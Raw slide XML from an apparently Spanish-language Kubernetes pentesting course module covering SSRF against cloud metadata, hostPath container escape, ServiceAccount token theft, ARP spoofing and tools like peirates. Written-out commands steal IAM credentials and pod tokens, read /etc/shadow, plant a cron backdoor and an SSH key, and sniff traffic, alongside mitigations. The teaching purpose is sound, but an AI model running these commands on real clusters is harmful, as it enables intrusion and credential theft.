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61" r:id="rId7"/>
    <p:sldId id="262" r:id="rId8"/>
    <p:sldId id="263" r:id="rId9"/>
    <p:sldId id="264" r:id="rId10"/>
    <p:sldId id="267" r:id="rId11"/>
    <p:sldId id="259" r:id="rId12"/>
    <p:sldId id="260" r:id="rId13"/>
    <p:sldId id="287" r:id="rId14"/>
    <p:sldId id="288" r:id="rId15"/>
    <p:sldId id="271" r:id="rId16"/>
    <p:sldId id="274" r:id="rId17"/>
    <p:sldId id="276" r:id="rId18"/>
    <p:sldId id="272" r:id="rId19"/>
    <p:sldId id="289" r:id="rId20"/>
    <p:sldId id="283" r:id="rId21"/>
    <p:sldId id="284" r:id="rId22"/>
    <p:sldId id="285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8" y="7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F2C96-6D44-41C8-ABA9-3321A267AC54}" type="datetimeFigureOut"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15D3F3-1EA7-4BDD-AA73-CCF5128D5189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663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3049D-B4BA-8B50-C04A-E44722A16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C85B0-417A-489F-59A1-E366881827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1C800-8B79-BBB1-DEEB-5C02FAB95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AD3EA-8935-666D-A9D9-C02919B953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56022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9144000" cy="1691640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="12121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Técnicas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 Ataque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28575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5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SSRF &amp; Metadata  •  hostPath Abuse  •  Herramientas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Ofensiva en Kubernetes — Técnicas Reales de Pentesting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30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Unidad 5 — Técnicas Ofensivas en Kubernetes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73352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673352"/>
            <a:ext cx="54864" cy="530352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6479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17320" y="167335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 Metadata &amp; SSRF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417320" y="192221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IMDS (169.254.169.254), SSRF desde Pods, exfiltración de credenciales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589520" y="1719072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40080" y="2295144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40080" y="2295144"/>
            <a:ext cx="54864" cy="53035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38658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232257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del hostPath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417320" y="256946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filesystem del host, lectura de secretos, container escape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589520" y="2340864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640080" y="2980944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40080" y="2980944"/>
            <a:ext cx="54864" cy="53035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72384"/>
            <a:ext cx="347472" cy="34747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417320" y="300837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Automatizadas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417320" y="325526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kube-hunter, peirates, kubeaudit, kube-bench, trivy, kubeletctl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7589520" y="3026664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640080" y="3602736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640080" y="3602736"/>
            <a:ext cx="54864" cy="53035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694176"/>
            <a:ext cx="347472" cy="34747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417320" y="363016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Labs Prácticos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1417320" y="387705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de ataque real con explotación y remediación paso a paso</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Text 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7589520" y="3648456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41" name="Text 3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 Cloud Metadata &amp; SSRF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endpoint 169.254.169.254 es la joya de la corona en la nube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0241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instancia en AWS/GCP/Azure tiene un Instance Metadata Service (IMDS) en 169.254.169.254. Un Pod puede acceder a este endpoint y robar credenciales del nodo.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651760" cy="4572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(EC2 / EKS)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008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http://169.254.169.254/latest/meta-data/
curl .../iam/security-credentials/&lt;role&gt;
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="7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AccessKeyId, SecretAccessKey, Token
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="7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IMDSv1: sin autenticación!
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333756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3337560" y="1783080"/>
            <a:ext cx="2651760" cy="4572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9202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4048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GCP (GCE / GKE)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342900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352044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-H 'Metadata-Flavor: Google' \
  http://169.254.169.254/computeMetadata/v1/
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="750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project-id, service-account tokens
→ access_token para GCP APIs
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621792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217920" y="1783080"/>
            <a:ext cx="265176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2084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(VM / AKS)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30936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640080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-H 'Metadata: true' \
  http://169.254.169.254/metadata/
  instance?api-version=2021-02-01
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="7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subscriptionId, identity tokens
</a:t>
            </a:r>
            <a:endParaRPr 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1A0F0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805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20140" y="4466191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(Server-Side Request Forgery): </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-E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 cuando una aplicación permite que un usuario controle la URL a la que el servidor realiza una petición HTTP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atacante puede redirigir la petición a 169.254.169.254 y exfiltrar credenciales del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https://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/                              -------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Enumerar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Roles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IAM (AWS)</a:t>
            </a:r>
          </a:p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https://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/webserver-role  ------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ROL</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29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SSRF Attack Flow en Kubernetes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vulnerabilidad web a credenciales de la nube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2011680" cy="457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23444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61872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148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Vulnerabilidad SSRF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1148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aplicación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Usuario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URL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servidor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consulta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/api/fetch?url=&lt;user_input&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="8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01168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60320" y="1097280"/>
            <a:ext cx="2011680" cy="457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2651760" y="123444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265176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126187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6517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 a IMDS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265176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redirige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petición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 IMDS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800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>http://169.254.169.254/latest/meta-data/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iam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/...</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="8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011680"/>
            <a:ext cx="182880" cy="18288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480060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4800600" y="1097280"/>
            <a:ext cx="201168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4892040" y="123444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8920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1261872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204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Credenciales Expuestas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489204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IMDS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devuelve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temporales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del IAM ROLE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AccessKeyId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SecretAccessKey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SessionToken</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="8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011680"/>
            <a:ext cx="182880" cy="18288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704088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2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7040880" y="1097280"/>
            <a:ext cx="2011680" cy="4572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7132320" y="123444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/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232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261872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3232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 Cloud APIs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713232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las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acceder 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nube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s3 ls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ec2 describe-instances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CONTROL TOTAL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Shape 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="3611880"/>
            <a:ext cx="8229600" cy="128016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7" name="Shape 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="3611880"/>
            <a:ext cx="54864" cy="1280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703320"/>
            <a:ext cx="274320" cy="27432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105156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Mitigación SSRF &amp; Metadata</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="12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114800"/>
            <a:ext cx="182880" cy="18288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1440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IMDSv2 (AWS)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822960" y="4319733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token de session para acceder al IMDS – Reduce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SSRF Simples</a:t>
            </a:r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7480" y="4114800"/>
            <a:ext cx="182880" cy="182880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292608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NetworkPolicy</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="45" name="Text 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2779776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169.254.169.254 desde Pods</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="75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9160" y="4114800"/>
            <a:ext cx="182880" cy="182880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493776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Validación de URLs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="Text 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4937760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confiables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Ips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114800"/>
            <a:ext cx="182880" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="50" name="Text 36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="694944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 Identity</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="51" name="Text 37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6812280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usar las del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sp>
        <p:nvSpPr>
          <p:cNvPr id="52" name="Text 3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del hostPath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 volumen te da las llaves del reino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241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hostPath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directorios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un Pod. SI un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atacante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Pod,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acceder o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host.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3931920" cy="19202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436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YAML Vulnerable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94360" y="2011680"/>
            <a:ext cx="3657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VULNERABLE: hostPath monta /
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="85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host-root
    hostPath:
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path: /              # ⚠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Acceso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 al Host!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type: Directory
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="85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volumeMounts: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host-root
    mountPath: /host
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readOnly: false        # ⚠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Permite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Escritura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754880" y="1691640"/>
            <a:ext cx="3931920" cy="19202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75488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89204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Vectores de Explotación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92040" y="1984248"/>
            <a:ext cx="3657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Qué puede hacer el atacante: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Leer credenciales del host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
cat /host/etc/kubernetes/admin.conf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Leer tokens de otros Pods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/host/var/lib/kubelet/pods/ \
  -name 'token' -exec cat {} \;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Escribir crontab para persistencia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'* * * * * /tmp/backdoor' \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&gt;&gt; /host/var/spool/cron/root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0080" y="3813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Niveles de Riesgo por Ruta hostPath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2062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4864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55448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CRÍTICO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4864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total al host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56032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560320" y="420624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265176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ALTO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65176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Credenciales, configs del nodo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66344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4663440" y="420624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75488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6072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MEDIO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75488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con info sensible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76656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6766560" y="42062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85800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/var/run/docker.sock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786384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CRÍTICO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85800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del container runtime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Escape via hostPath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Pod comprometido al control total del nodo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1600200" cy="36576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68680" y="1188720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al Pod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obtiene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ejecución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dentro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un Pod</a:t>
            </a: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RCE o kubectl exec en Pod con hostPath: /</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="7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952" y="1828800"/>
            <a:ext cx="164592" cy="16459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5740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057400" y="1051560"/>
            <a:ext cx="1600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651760" y="118872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26517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14884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Leer /etc/shadow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214884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accede al filesystem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desde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 → hashes de usuarios del host</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="75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828800"/>
            <a:ext cx="164592" cy="16459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384048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840480" y="1051560"/>
            <a:ext cx="160020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4434840" y="118872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43484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393192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Escribir SSH Key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393192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agrega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clave SSH al Usuario root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'ssh-rsa ...' &gt;&gt; /host/root/.ssh/authorized_keys</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="75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164592" cy="16459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2356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623560" y="1051560"/>
            <a:ext cx="160020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6217920" y="118872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62179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71500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SSH al Host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571500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conecta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directamente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root@&lt;node-ip&gt; → acceso completo al nodo</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750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828800"/>
            <a:ext cx="164592" cy="16459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40664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7406640" y="1051560"/>
            <a:ext cx="1600200" cy="36576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9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8001000" y="118872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800100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749808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Pivot al Cluster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749808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utiliza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controlar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cluster</a:t>
            </a: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--kubeconfig /etc/kubernetes/admin.conf get nodes</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Shape 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="3108960"/>
            <a:ext cx="8229600" cy="182880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457200" y="310896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00400"/>
            <a:ext cx="274320" cy="27432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105156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Defensas contra hostPath Abuse</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0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611880"/>
            <a:ext cx="182880" cy="18288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60120" y="35661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Security Admission (PSA)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="45" name="Text 37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="960120" y="3822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enforce: restricted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prohíbe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hostPath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enforce: baseline lo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advierte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00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611880"/>
            <a:ext cx="182880" cy="182880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074920" y="35661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OPA / Kyverno Policies</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="Text 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5074920" y="3822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custom para bloquear rutas peligrosas: /, /etc, /var/run/docker.sock.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="8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97680"/>
            <a:ext cx="182880" cy="1828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960120" y="42519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readOnly: true</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="51" name="Text 41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="96012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hostPath es necesario (logs), montarlo SIEMPRE como readOnly: true.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="52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4297680"/>
            <a:ext cx="182880" cy="182880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5074920" y="42519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con kube-bench</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="54" name="Text 43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="507492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Benchmark 1.1.12: verificar que no existan hostPath en Deployments.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Ofensivas Automatizadas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Arsenales de pentesting para Kubernetes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743200" cy="457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kube-hunter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de vulnerabilidades K8s. Ejecuta desde dentro o fuera del cluster. Detecta tokens expuestos, API servers abiertos, dashboards sin auth.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6576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Desde dentro del cluster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--pod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Remoto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--remote &lt;ip&gt;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Reporte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--report json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200400" y="1051560"/>
            <a:ext cx="2743200" cy="457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188720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peirates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3756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Post-explotación K8s. Enumeración automática de SA tokens, secrets, cloud metadata. Movimiento lateral, pivoting y escalada de privilegios.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29184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338328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Lanzar en Pod comprometido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./peirates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Opciones automáticas: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Get SA token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List secrets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Mount cloud metadata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 Create priv pod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12648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126480" y="105156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8368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kubeletctl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 directa con la Kubelet API (puerto 10250). Ejecutar comandos en contenedores sin pasar por el API Server.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621792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630936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Escanear kubelets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kubeletctl scan --cidr 10.0.0.0/24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Ejecutar comando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kubeletctl exec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/bin/sh -c 'id'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-p &lt;pod&gt; -c &lt;container&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26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Tráfico Interno: HTTP Plano = Peligro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Sin mTLS, un atacante en un Pod puede sniffear todo el tráfico del namespace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Sniffing de Tráfico Interno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Desde un Pod comprometido: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Capturar tráfico con tcpdump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-s0 port 80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Filtrar credenciales HTTP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 \
  'password\|token\|auth\|cookie'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Capturar headers de Authorization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 \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'Authorization: Bearer'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BBF2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🔍 Verificar Capabilities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Requisito: CAP_NET_RAW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Verificar capabilities del container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cat /proc/1/status | grep Cap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CapPrm: 00000000a80425fb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Decodificar capabilities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capsh --decode=00000000a80425fb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cap_net_raw (bit 13) ✓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Permite: tcpdump, raw sockets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Permite: ARP spoofing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32644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Qué puede capturar un atacante con sniffing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1304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2296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HTTP entre microservicios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4864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Credenciales, API keys, datos de usuario en texto plano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256032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560320" y="37033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381304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292608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gRPC sin TLS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2651760" y="4114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Protobuf decodificable, tokens en metadata headers.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Protobuf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s-E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 una forma compacta y binaria de enviar datos entre servicios. (Codificados)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5" name="Shape 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="466344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2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4663440" y="370332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813048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02920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Redis/MongoDB sin auth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475488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 en texto plano, comandos de control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676656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6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6766560" y="3703320"/>
            <a:ext cx="192024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3813048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13232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DNS queries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85800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Revelan qué servicios está consultando cada Pod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 / 30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58437" y="202475"/>
            <a:ext cx="90199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 Capabilities </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US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Linux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8437" y="692331"/>
            <a:ext cx="77528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Las </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-E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determinan qué acciones privilegiadas puede realizar un contenedor en el sistema.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39C12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4216" y="1028700"/>
            <a:ext cx="478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Linux divide los privilegios de ‘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’ en permisos pequeños llamados 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b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un contenedor recibe demasiadas, puede volverse peligroso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457200" y="1691640"/>
          <a:ext cx="8229600" cy="257860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Capability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Riesgo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Qué Permite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Herramientas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CAP_NET_RAW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capturar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 manipular </a:t>
                      </a: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tráfico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red.</a:t>
                      </a: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tcpdump, arpspoof, scapy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CAP_SYS_PTRACE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Trazar procesos: leer memoria de otros containers en el mismo Pod (shareProcessNamespace). Inyectar código.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strace, /proc/PID/mem, gdb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CAP_SYS_ADMIN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a root casi completo. Mount filesystems, cgroups escape, namespace manipulation.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mount, nsenter, unshare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973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CAP_DAC_OVERRIDE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Bypass de permisos de archivos. Leer/escribir cualquier archivo ignorando permisos Unix.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 /etc/shadow (bypass)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39C1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CAP_NET_ADMIN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 cambiar la configuración de red del contenedor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iptables, rutas, interfaces. Redirigir tráfico, crear túneles, MITM.</a:t>
                      </a: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iptables, ip route, tc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CAP_SETUID/GID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 cambiar la identidad del proceso (usuario/grupo).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UID/</a:t>
                      </a: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GID del proceso. Escalar a root dentro del container.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setuid binary, su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064E3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63600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“Buenas prácticas: eliminar todas las </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-E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por defecto y agregar solo las estrictamente necesarias.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0B98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 capabilities: { drop: ["ALL"] } + agregar SOLO las necesarias (add: ["NET_BIND_SERVICE"])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/ 30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8F8538-9D9D-F449-422E-F4BDEFC9C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E9898E4-AD0D-2866-BD87-CB13F310CEA3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5FC4E04-8872-0616-3FAB-E7CB0E5680BF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr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CAP_NET_RAW: Sniffing &amp; ARP Spoofing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1684E59-1D67-FFAB-1D6E-1CE7B04A29E7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr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capability más común y más peligrosa en containers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D358E55-9CA4-D8E1-D965-943D18A49D07}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1051560"/>
            <a:ext cx="3931920" cy="236829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9F79BF2-6F9D-121D-FC08-DE38C6823F9B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr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BDA082-3AC3-3D37-57F7-EFBF9FF7A2E8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr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ARP Spoofing Attack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58A885-56F2-6C0A-7BEA-565B4454053F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594360" y="1371600"/>
            <a:ext cx="3657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ARP Spoofing desde un Pod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Requiere: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1.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Preparar el host para reenviar paquetes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1 &gt; /proc/sys/net/ipv4/ip_forward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2.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Envenenar ARP (suplantación ARP) para “convencer” a la víctima de que el atacante es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gateway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arpspoof -i eth0 -t &lt;victim-pod-ip&gt; \
  &lt;gateway-ip&gt;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Capturar tráfico que ahora atraviesa el atacante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eth0 -w capture.pcap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C0EC451-6AFB-086E-516E-92952D8E69E5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4754880" y="1051560"/>
            <a:ext cx="3840480" cy="2386584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BE0BC01-A8EE-4196-F49F-E8E872DD08D4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr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0FDE826-5C73-FB5F-233E-586CF5394433}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr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✅ Mitigación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487EBF1-1CE3-1A7B-D702-518F9656EC5A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4892040" y="1371600"/>
            <a:ext cx="36118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Pod sin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5B8DEF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securityContext:
  capabilities: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drop: ["ALL"]       # ✅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Elimina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todas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las capabilities
    add: []             # ✅ No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agrega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privilegios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# ✅ PSA restricted elimina NET_RAW
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Bloquea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capabilities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peligrosas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10B981"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uLnTx/>
              <a:uFillTx/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Automático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modo restricted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Cilium CNI puede bloquear ARP
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Antispoofing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kernel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mTLS (Istio/Linkerd) cifra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Cifra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tráfico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interno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326CE5"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uLnTx/>
              <a:uFillTx/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Mitiga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sniffing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efectivo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E30C7BA-974B-7F38-3A5B-4CEF7805F760}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr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685AF15-2DB6-D71D-9AFB-20F7E221C3CC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr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🔗 Cadena: CAP_NET_RAW → ARP Spoof → MITM → Capturar credenciales HTTP → Movimiento Lateral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6A5D9C5-2E83-4749-D582-AD8CD5BEE95E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="45720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E169E4B-F00A-0BC6-A3E4-A091A3226076}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="379476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6014E80-9C25-94CF-49DA-E7F2CBF50BDC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="54864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ARP Spoof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4FC9C29-7D31-1A6C-5AFC-A59D06A55027}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="4073652"/>
            <a:ext cx="1920240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Envenenar tabla ARP de la víctima para </a:t>
            </a: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redirigir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tráfico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se hace pasar por otro equipo en la red. Redirige el tráfico hacia él para interceptarlo.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47AF5530-AD81-C23A-39D2-8179E65CB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160520"/>
            <a:ext cx="137160" cy="137160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Shape 17">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{646E6C7A-815B-F3D4-B642-9FB3EB6DD8C5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="256032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7FA16EF-E1D4-9EF8-3B20-B4B10F2DE98F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2560320" y="379476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2FEE9F58-8C5D-EE84-C8F3-7AFF05557CDB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="265176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MITM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5978853-E476-3ADE-FA64-977237E71128}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="265176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Todo el tráfico de la víctima pasa por el atacante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B1D25334-6E58-B844-25CB-B6B2B303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4160520"/>
            <a:ext cx="137160" cy="137160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Shape 21">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{730FD5F1-D1C9-D65E-0FDE-4B6FCC7F5514}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="466344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AAB41C1A-5159-3226-6B9E-8D70B3F44BFB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4663440" y="379476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A88996-AD27-4247-4A7F-21B68C4CDD8F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="475488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Capturar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49B395B2-4E7F-0201-883F-8F0615232C3C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="475488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tcpdump/tshark extrae credenciales, tokens, API keys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F3AA7441-B7E8-EA18-1EBB-E65B9B473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60520"/>
            <a:ext cx="137160" cy="137160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Shape 25">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E030F3C7-B820-620C-99B6-F1DB11071016}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="676656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BB90F392-6519-E128-A034-85EA5ADADC71}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6766560" y="3794760"/>
            <a:ext cx="1920240" cy="36576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4CC95C98-9E89-727E-A704-5C13B899E98A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800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6B6B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Reutilizar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5AFCC76C-FBFB-3F6B-5357-9A23B46591E8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800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Tokens capturados se usan para impersonar la víctima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7DCA1D94-8134-BB14-A094-DA4A47D11A65}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr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7/ 30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8560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 JWT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ServiceAccount Tokens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85800" y="6949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token JWT es la identidad del </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-E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frente al API Server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241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Cada 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recibe automáticamente un token firmado por el API Server. Ese token representa su identidad (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ServiceAccount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). Robarlo es como robar su credencial de acceso.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8B5CF6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3931920" cy="164592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🔑 Extraer Token JWT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94360" y="2011680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Ubicación del token en el Pod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cat /var/run/secrets/kubernetes.io\
  /serviceaccount/token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Decodificar JWT (base64 del payload)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$TOKEN | cut -d. -f2 | \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base64 -d 2&gt;/dev/null | jq .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54880" y="1691640"/>
            <a:ext cx="3931920" cy="164592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75488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89204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📋 JWT Payload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92040" y="2011680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Contenido del JWT decodificado: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5B8DEF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"iss": "kubernetes/serviceaccount",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"sub": "system:serviceaccount:
